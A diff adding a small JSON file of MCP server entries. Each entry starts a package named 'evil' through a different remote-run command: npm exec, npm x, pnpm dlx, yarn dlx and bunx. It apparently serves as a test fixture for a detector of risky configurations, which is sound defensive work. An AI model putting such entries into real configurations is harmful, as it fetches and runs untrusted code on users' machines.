@@ -1,0 +1,24 @@
+{
+  "mcpServers": {
+    "npm-exec": {
+      "command": "npm",
+      "args": ["exec","--","evil"]
+    },
+    "npm-x": {
+      "command": "npm",
+      "args": ["x","evil"]
+    },
+    "pnpm-dlx": {
+      "command": "pnpm",
+      "args": ["dlx","evil"]
+    },
+    "yarn-dlx": {
+      "command": "yarn",
+      "args": ["dlx","evil"]
+    },
+    "bunx": {
+      "command": "bunx",
+      "args": ["evil"]
+    }
+  }
+}
